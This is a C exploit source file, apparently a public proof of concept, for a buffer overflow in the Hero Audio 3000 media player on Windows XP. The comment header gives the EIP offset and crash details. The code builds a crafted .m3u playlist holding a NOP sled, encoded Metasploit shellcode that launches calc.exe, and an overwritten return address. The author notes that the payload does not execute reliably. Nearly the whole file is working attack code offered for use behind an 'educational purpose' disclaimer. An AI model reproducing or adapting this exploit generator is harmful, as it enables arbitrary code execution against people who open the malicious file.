/*0day Hero Audio 3000 
Credits for finding the bug go to fl0 fl0w.
Exploit by fl0 fl0w,feel free to contact me at : 
flo_fl0w_supremacy@yahoo.com

_Description_
This POC was tested on Hero Audio 3000, Windows Xp sp2 English,compiled 
with Dev-C++ 4.9.9.2 . 
When parsing a crafted .m3u file 
the application crashes.The shellcode gets executed 
but for some reason the program
doesen't run,it just crashes.If someone does manage 
to execute payload feel free to e-mail.
Note :After you open the TestFile click on DelUnselect,that's
when the crash will happen.

_Disclaimer_
This POC was written for educational purpose. Use it at your own 
risk.Author 
will be not be responsible for any damage.

_Web_: 
http://www.download.com/Hero-Super-Player-3000/3000-2139_4-10401910.html?tag=lst-3

_Debug info_
This is a classical buffer overflow,we get control of the EIP register.
EIP=00CODEFE
Acces violation:
XCHG DWORD PTR DS:[EDI+87878788],EAX      
      EAX=00000000
      DS:[05CA7B0B]=??? 
The application puts a NULL byte as first in the address so in this case 
I gived a random address FFC0DEFE.
When I was looking for the offset I used strings so the first thing 
you'll 
see if you want to debug the application yourself is 
 EIP=00585858,if you craft the .m3u file with 253 or more XXX's strings.
 */

#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include<windows.h>

#define m3u_file "TestFile.m3u"
#define PRES "C:\\" 
#define POST ".mp3" 

#define EIP_OFFSET 253
#define SC1_SIZE 162


/* win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 
Encoder=PexFnstenvSub http://metasploit.com */
unsigned char shellcode1[] =
"\x6a\x23\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xec\x61\x0e"
"\x31\x83\xeb\xfc\xe2\xf4\x10\x89\x4a\x31\xec\x61\x85\x74\xd0\xea"
"\x72\x34\x94\x60\xe1\xba\xa3\x79\x85\x6e\xcc\x60\xe5\x78\x67\x55"
"\x85\x30\x02\x50\xce\xa8\x40\xe5\xce\x45\xeb\xa0\xc4\x3c\xed\xa3"
"\xe5\xc5\xd7\x35\x2a\x35\x99\x84\x85\x6e\xc8\x60\xe5\x57\x67\x6d"
"\x45\xba\xb3\x7d\x0f\xda\x67\x7d\x85\x30\x07\xe8\x52\x15\xe8\xa2"
"\x3f\xf1\x88\xea\x4e\x01\x69\xa1\x76\x3d\x67\x21\x02\xba\x9c\x7d"
"\xa3\xba\x84\x69\xe5\x38\x67\xe1\xbe\x31\xec\x61\x85\x59\xd0\x3e"
"\x3f\xc7\x8c\x37\x87\xc9\x6f\xa1\x75\x61\x84\x8e\xc0\xd1\x8c\x09"
"\x96\xcf\x66\x6f\x59\xce\x0b\x02\x6f\x5d\x8f\x4f\x6b\x49\x89\x61"
"\x0e\x31";
			
void author_information();
void software_information();
void doc_meniu();

int main(int argc, char **argv)
{ 
  FILE *file;
  unsigned char *buffer;
  unsigned int input_offs;
  unsigned int offset=0;
  unsigned long retaddress=0xFF12EB08;
   printf("Herro Audio 3000 .m3u file Buffer Overflow Exploit\n ");
   printf("SPECIAL THANKS TO EXPANDERS\n\n");
   printf(" {*}1.Crash the application\n");
   printf(" {*}2.Exit\n"); 
  int input;
  scanf("%d",&input);
  switch(input) 
  { case 1:
    buffer = (unsigned char *)malloc(EIP_OFFSET+5); // 5 = 4 bytes 
retaddress + 1 byte null termination
    
           if((file=fopen(m3u_file,"wb"))==NULL) 
             { 
             printf("Not able to create the file");
             exit(0);
             } 
  
  memset(buffer,0x90,EIP_OFFSET+5); // FILL ENTIRE BUFFER WITH NOPS
  offset+=12;  // let's leave 12 bytes of nops at the beginning
  memcpy(buffer+offset,shellcode1,SC1_SIZE); 
  offset+=SC1_SIZE; 
  offset=EIP_OFFSET; // I point directly to the ret offset
  memcpy(buffer+offset,&retaddress,4); 
  offset+=4; // 4 bytes of the retaddress.
  memset(buffer+offset,0x00,1); //terminating
  fprintf(file,"%s%s%s",PRES,buffer,POST);
   fclose(file);
  printf("File succesfully generated\n");
  case 2:  exit(0);
 }
  return 0; 
}

